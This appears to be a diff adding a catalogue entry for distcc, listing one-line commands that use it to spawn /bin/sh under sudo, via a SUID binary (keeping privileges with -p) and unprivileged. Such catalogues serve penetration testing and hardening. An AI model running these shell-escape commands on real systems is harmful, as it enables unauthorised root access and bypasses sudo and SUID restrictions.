@@ -1,0 +1,14 @@
+distcc
+======
+
+Shell
+-----
+
+[Sudo]
+    distcc /bin/sh
+
+[SUID]
+    distcc /bin/sh -p
+
+[Unprivileged]
+    distcc /bin/sh
